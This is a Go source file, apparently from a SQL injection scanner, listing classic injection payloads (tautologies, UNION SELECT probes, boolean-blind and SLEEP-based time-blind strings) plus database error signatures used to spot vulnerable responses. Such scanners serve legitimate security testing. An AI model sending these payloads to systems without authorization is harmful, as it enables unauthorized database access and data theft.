package payloads

var BasicPayloads = []string{
	"' OR '1'='1",
	"' OR '1'='1' --",
	"' OR '1'='1' /*",
	"' OR 1=1 --",
	"' OR 1=1 /*",
	"' OR 'a'='a",
	"1' OR '1'='1",
}

var UnionPayloads = []string{
	"' UNION SELECT NULL --",
	"' UNION SELECT NULL,NULL --",
	"' UNION SELECT NULL,NULL,NULL --",
	"' UNION SELECT 1,2,3 --",
}

var BlindPayloads = []string{
	"' AND '1'='1",
	"' AND '1'='2",
	"' AND 1=1 --",
	"' AND 1=2 --",
}

var TimeBasedPayloads = []string{
	"' AND SLEEP(5) --",
	"' AND SLEEP(10) --",
	"' OR SLEEP(5) --",
}

var ErrorSignatures = []string{
	"SQL syntax",
	"MySQL",
	"PostgreSQL",
	"SQLServer",
	"Oracle",
	"syntax error",
	"database error",
}

func GetAllPayloads() []string {
	var all []string
	all = append(all, BasicPayloads...)
	all = append(all, UnionPayloads...)
	all = append(all, BlindPayloads...)
	all = append(all, TimeBasedPayloads...)
	return all
}

func GetBasicPayloads() []string {
	return BasicPayloads
}

func GetAdvancedPayloads() []string {
	var advanced []string
	advanced = append(advanced, UnionPayloads...)
	advanced = append(advanced, BlindPayloads...)
	advanced = append(advanced, TimeBasedPayloads...)
	return advanced
}
